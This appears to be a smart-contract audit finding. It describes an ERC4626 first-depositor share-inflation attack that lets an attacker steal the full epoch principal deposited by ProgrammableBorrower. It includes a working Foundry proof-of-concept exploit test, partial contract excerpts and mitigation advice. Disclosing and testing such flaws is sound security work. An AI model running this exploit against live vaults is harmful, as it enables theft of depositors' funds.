### Title
ERC4626 first-depositor inflation drains programmable-borrower principal - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
`ProgrammableBorrower` accepts any ERC4626 vault with the correct `asset()` and deposits idle principal without enforcing a nonzero or minimum share output. [1](#0-0) [2](#0-1) 

An unprivileged depositor in the configured public vault can perform the classic first-depositor/share-price inflation attack before the borrower’s first deposit. `onStartEpoch()` snapshots the pre-deposit principal, calls `_depositToVault()`, and ignores the returned share count. [3](#0-2) [2](#0-1) 

### Finding Description
The attack requires the configured ERC4626 vault to be empty, permissionless, and lack inflation protection such as dead shares, virtual shares, or a minimum-share check.

1. The attacker deposits `1` underlying unit into the empty vault and receives `1` share.
2. The attacker directly transfers approximately the borrower’s expected principal `P` to the vault, inflating each share to more than `P`.
3. During the honest manager’s `startEpoch()`, the CDO transfers `P` to `ProgrammableBorrower`. [4](#0-3) 
4. `onStartEpoch()` deposits all `P` into the inflated vault. Standard floor rounding mints zero shares to `ProgrammableBorrower`. [5](#0-4) [2](#0-1) 
5. The attacker redeems the sole vault share and receives approximately `2P`, extracting the full `P` deposited by the credit pool.
6. `ProgrammableBorrower` now has no underlying and no vault shares, while `epochStartVaultAssets` remains `P`.

The principal loss is only reflected in `totalInterestDueNow()` as a net loss that is floored to zero. It is not converted into a default condition or a principal haircut. [6](#0-5) 

If there are no pending withdrawals in minted-interest mode, `_amountToPullFromBorrower` is zero. `onStopEpoch(0, false)` therefore succeeds without withdrawing vault liquidity, and the subsequent zero-amount `transferFrom` can succeed. [7](#0-6) [8](#0-7) 

The CDO then performs accounting and exits the running epoch based on its still-held strategy-token balance, even though the corresponding underlying was stolen from the external vault. [9](#0-8) [10](#0-9) 

### Impact Explanation
This is direct theft of credit-pool principal.

For a first programmable deposit of `P`, the attacker contributes approximately `P + 1` units and redeems approximately `2P + 1` units, yielding a profit of approximately `P`. The credit pool loses the entire deposited principal while its CDO-held strategy-token NAV remains `P`. [5](#0-4) [2](#0-1) 

The broken invariant is solvency: strategy tokens continue to represent principal that is no longer recoverable from either the external vault or the borrower ledger. With no pending withdrawals, the epoch can stop successfully and normal operations can reopen after the theft. [11](#0-10) 

### Likelihood Explanation
Likelihood is conditional but realistic for a permissionless, empty ERC4626 vault that uses simple floor-based share accounting. `setVault()` validates only the vault asset and the absence of an existing `ProgrammableBorrower` position; it does not require nonzero total supply, dead shares, virtual offsets, or a trusted vault implementation. [1](#0-0) 

The attacker does not need control of the vault. They only need to make the first ordinary deposit and send underlying directly to it before `ProgrammableBorrower` first deposits. All privileged actors remain honest, and the exploitation transaction is timed around the manager’s ordinary `startEpoch()` call. [12](#0-11) 

The existing skim and donated-asset protections do not stop the attack because the donation is made to the external ERC4626 vault, not directly to the CDO. [13](#0-12) [14](#0-13) 

### Recommendation
Do not rely on `vault.deposit()` returning economically fair shares. Require a `minShares` argument or an explicit post-deposit invariant such as:

```solidity
uint256 shares = vault.deposit(_assetAmount, address(this));
if (shares == 0 || vault.convertToAssets(shares) < _assetAmount - maxRoundingLoss) {
    revert InvalidAmount();
}
```

Relevant insertion point: `contracts/strategies/idle/ProgrammableBorrower.sol:378-384`.

Additional mitigations:

- Require configured vaults to have nonzero seed supply or recognized inflation protection.
- Seed a new vault with permanently locked shares before accepting pool principal.
- Reconcile `totalUnderlying()` against `epochStartVaultAssets` during `onStartEpoch()` and `onStopEpoch()`.
- Treat an otherwise unexplained principal shortfall as a borrower/default event rather than flooring the loss through `totalInterestDueNow()`.
- Consider limiting the vault allowance to the amount being deposited instead of an unlimited approval. [15](#0-14)

import {ProgrammableBorrower} from

contract TestToken is ERC20 {
    constructor() ERC20("Underlying", "UND") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// @notice Ordinary floor-rounding ERC4626-like vault with no inflation defense.
contract InflatableVault is ERC20 {
    IERC20 public immutable assetToken;

    constructor(IERC20 asset_) ERC20("Vault Share", "vUND") {
        assetToken = asset_;
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function totalAssets() public view returns (uint256) {
        return assetToken.balanceOf(address(this));
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply();
        return supply == 0 ? 0 : shares * totalAssets() / supply;
    }

    function deposit(uint256 assets, address receiver)
        external
        returns (uint256 shares)
    {
        uint256 supply = totalSupply();
        shares = supply == 0
            ? assets
            : assets * supply / totalAssets();

        assetToken.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
    }

    function redeem(uint256 shares, address receiver, address owner)
        external
        returns (uint256 assets)
    {
        if (msg.sender != owner) revert("allowance not implemented");
        assets = convertToAssets(shares);
        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }
}

/// @notice Minimal stand-in exposing the calls used by ProgrammableBorrower.
contract CdoHarness {
    address public immutable token;
    ProgrammableBorrower public immutable borrowerAdapter;

    constructor(address token_, ProgrammableBorrower borrowerAdapter_) {
        token = token_;
        borrowerAdapter = borrowerAdapter_;
    }

    function start(uint256 assets) external {
        IERC20(token).transfer(address(borrowerAdapter), assets);
        borrowerAdapter.onStartEpoch(0);
    }

    function stop() external returns (uint256) {
        uint256 interest = borrowerAdapter.totalInterestDueNow();
        require(borrowerAdapter.onStopEpoch(interest, false), "stop failed");
        return interest;
    }
}

contract ProgrammableBorrowerInflationTest is Test {
    uint256 internal constant P = 1_000_000e18;

    function testFirstDepositorInflationStealsEpochPrincipal() external {
        // Fork any supported production network before deploying the harness:
        // vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));

        TestToken underlying = new TestToken();
        InflatableVault vault = new InflatableVault(IERC20(address(underlying)));

        ProgrammableBorrower implementation = new ProgrammableBorrower();
        CdoHarness cdo;

        {
            cdo = new CdoHarness(
                address(underlying),
                ProgrammableBorrower(address(0))
            );
        }

        ProgrammableBorrower borrowerAdapter = ProgrammableBorrower(
            address(
                new TransparentUpgradeableProxy(
                    address(implementation),
                    address(this),
                    ""
                )
            )
        );

        // Rebind the harness to the real borrower adapter.
        cdo = new CdoHarness(address(underlying), borrowerAdapter);

        borrowerAdapter.initialize(
            address(vault),
            address(cdo),
            address(this),
            address(this),
            makeAddr("realBorrower"),
            0
        );

        address attacker = makeAddr("attacker");
        underlying.mint(attacker, P + 1);

        vm.startPrank(attacker);
        underlying.approve(address(vault), type(uint256).max);

        // Seed supply and inflate the sole share above P.
        vault.deposit(1, attacker);
        underlying.transfer(address(vault), P);
        vm.stopPrank();

        // Honest CDO deposits P into ProgrammableBorrower and starts the epoch.
        underlying.mint(address(cdo), P);
        cdo.start(P);

        // P / (P + 1) rounds to zero shares.
        assertEq(vault.balanceOf(address(borrowerAdapter)), 0);

        vm.prank(attacker);
        uint256 stolen = vault.redeem(1, attacker, attacker);

        assertEq(stolen, 2 * P + 1);
        assertEq(underlying.balanceOf(address(borrowerAdapter)), 0);
        assertEq(borrowerAdapter.vaultSharesBalance(), 0);

        // The contractual borrower owes nothing because the loss happened inside
        // the external ERC4626 sleeve rather than through borrow().
        uint256 stopInterest = cdo.stop();
        assertEq(stopInterest, 0);

        // In the real minted-interest path, the CDO requests only
        // pendingWithdrawals. With none pending, this is a zero-token pull and can
        // complete even though P underlying was stolen.
        assertEq(underlying.balanceOf(attacker), 2 * P + 1);
    }
}

  function onStartEpoch(uint256 _pendingWithdraws) external nonReentrant {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;

  function totalInterestDueNow() external view returns (uint256) {
    (uint256 vaultInterest, uint256 loss) = _vaultNetInterest();
    uint256 totalGain = vaultInterest + borrowerInterestAccruedNow() + bufferInterest;
    return totalGain > loss ? totalGain - loss : 0;

  /// @notice Compute the net vault delta split into interest and loss (mutually exclusive).
  function _vaultNetInterest() internal view returns (uint256 interest, uint256 loss) {
    if (!epochAccountingActive) return (0, 0);
